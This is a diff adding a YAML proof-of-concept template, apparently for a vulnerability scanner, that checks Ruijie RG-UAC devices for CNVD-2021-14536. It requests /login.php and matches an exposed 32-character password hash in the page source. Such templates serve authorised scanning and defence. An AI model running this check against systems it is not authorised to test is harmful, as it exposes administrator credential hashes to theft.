@@ -1,0 +1,23 @@
+id: poc-yaml-ruijie-uac-cnvd-2021-14536
+info:
+  name: Ruijie Uac (CNVD-2021-14536)
+  severity: high
+  tags:
+  - cnvd-2021-14536
+  - CNVD-2021-14536
+  finger: Ruijie Uac
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /login.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<title>RG-UAC登录页面</title>") &&
+    contains(body, "get_dkey_passwd") && matches(body, "\"password\":\"[a-f0-9]{32}\"")
+  output: []
